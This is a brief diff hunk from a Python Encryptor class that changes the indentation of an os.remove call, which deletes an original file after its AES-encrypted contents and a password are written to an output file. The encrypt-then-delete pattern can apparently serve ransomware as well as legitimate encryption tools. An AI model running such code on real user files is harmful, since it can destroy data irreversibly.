@@ -60,7 +60,7 @@ class Encryptor:
                 fOut.write(password + ' ')
                 # fOut.write(aes.encrypt(message))
                 fOut.write(self.__b64enc(aes.encrypt(message)))
-            os.remove(file)
+        os.remove(file)
 
     
     def encryptFiles(self,pubkey):
